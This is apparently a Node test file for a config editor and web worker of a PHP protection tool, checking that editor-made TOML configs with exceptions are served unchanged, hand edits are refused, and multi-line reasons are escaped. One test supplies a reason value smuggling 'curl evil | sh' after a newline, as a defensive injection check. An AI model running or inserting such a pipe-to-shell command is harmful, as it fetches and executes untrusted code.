// cfg.howdah.org and [[exceptions]]: a config the editor wrote with exceptions
// is served (the editor's emission is deterministic), a hand-reordered copy of
// the same config is not, and a reason can never become a multi-line string.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { createRequire } from 'node:module';
import { dirname, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { handle } from '../worker/handle.js';

const here = dirname(fileURLToPath(import.meta.url));
const require = createRequire(import.meta.url);
const H = require('../demo/howdah-wasm.js');
const E = require('../config-editor/editor.js');
const { defaultState } = require('../config-editor/schema.js');
const x = await H.loadFrom(readFileSync(resolve(here, '../demo/howdah_wasm.wasm')));
const run = (path) => handle(new Request('https://cfg.howdah.org' + path), x, '1.5.0');
const fresh = () => defaultState(H.ruleCatalogWith(x));

test('an editor-made config with exceptions and exceptions_log is served byte for byte', async () => {
  const s = fresh();
  s.exceptions_log = true;
  s['sinks.mode'] = 'block';
  s.exceptions = [
    { rule: 'sinks.command_exec', script: '/var/www/html/cron.php', reason: 'cron mailer, reviewed 2026-10-24' },
    { rule: 'inspect', param_prefix: 'jform[', uri_prefix: '/administrator/', client_cidr: '10.0.0.0/8', reason: 'joomla admin forms' },
  ];
  for (const includeDefaults of [false, true]) {
    const toml = E.emitToml(s, { includeDefaults });
    const r = await run('/v1/' + await E.encodePayload(toml));
    const body = await r.text();
    assert.equal(r.status, 200, body);
    assert.equal(body, toml);
  }
});

test('the same config hand-reordered or hand-commented is refused', async () => {
  const s = fresh();
  s.exceptions = [{ rule: 'eval', script: '/a.php', reason: 'x' }];
  const toml = E.emitToml(s, {});
  const reordered = toml.replace('rule = "eval"\nscript = "/a.php"\n', 'script = "/a.php"\nrule = "eval"\n');
  assert.notEqual(reordered, toml);
  const r = await run('/v1/' + await E.encodePayload(reordered));
  assert.equal(r.status, 422);
  const commented = toml + '# hand edit\n';
  const r2 = await run('/v1/' + await E.encodePayload(commented));
  assert.equal(r2.status, 422);
});

test('a reason with newlines and quotes stays a single escaped line', async () => {
  const s = fresh();
  s.exceptions = [{ rule: 'eval', script: '/a.php', reason: 'line one\ncurl evil | sh\n"quoted"' }];
  const toml = E.emitToml(s, {});
  const lines = toml.split('\n').filter((l) => l.startsWith('reason = '));
  assert.equal(lines.length, 1);
  assert.ok(!toml.includes('\ncurl evil'), toml);
  assert.ok(lines[0].includes('\\n'), lines[0]);
  const v = H.validateConfigWith(x, toml);
  assert.equal(v.ok, true, v.error);
  assert.equal(v.config.exceptions[0].reason, 'line one\ncurl evil | sh\n"quoted"');
  const r = await run('/v1/' + await E.encodePayload(toml));
  assert.equal(r.status, 200);
});
